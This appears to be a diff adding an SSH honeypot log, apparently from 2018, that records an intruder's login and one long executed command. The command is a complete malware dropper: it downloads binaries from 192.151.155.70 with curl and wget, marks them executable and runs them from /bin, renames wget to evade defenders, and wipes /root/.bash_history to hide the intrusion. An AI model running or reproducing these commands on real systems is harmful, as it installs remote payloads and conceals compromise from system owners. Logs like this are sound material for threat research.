@@ -1,0 +1,33 @@
+180315-21:12:57 login login successful 
+180315-21:12:58 channel_request session 
+180315-21:12:58 exec_request success 
+180315-21:12:58 exec command cd /bin/
+curl http://192.151.155.70/g.txt -o ygljglkjgfg0
+chmod +x ygljglkjgfg0
+/bin/ygljglkjgfg0
+wget http://192.151.155.70/g.txt -O ygljglkjgfg1
+chmod +x ygljglkjgfg1
+/bin/ygljglkjgfg1
+good http://192.151.155.70/g.txt -O ygljglkjgfg2
+chmod +x ygljglkjgfg2
+/bin/ygljglkjgfg2
+sleep 2
+wget http://192.151.155.70/w.txt -O sdf3fslsdf13
+chmod +x sdf3fslsdf13
+/bin/sdf3fslsdf13
+good http://192.151.155.70/w.txt -O sdf3fslsdf14
+chmod +x sdf3fslsdf14
+/bin/sdf3fslsdf14
+curl http://192.151.155.70/w.txt -o sdf3fslsdf15
+chmod +x sdf3fslsdf15
+/bin/sdf3fslsdf15
+sleep 2
+mv /usr/bin/wget /usr/bin/good
+mv /bin/wget /bin/good
+cat /dev/null >/root/.bash_history
+ls -la /etc/daemon.cfg
+exit $?
+ 
+180315-21:18:17 channel_request session 
+180315-21:18:17 exec_request success 
+180315-21:18:17 exec command ls -la /etc/daemon.cfg 
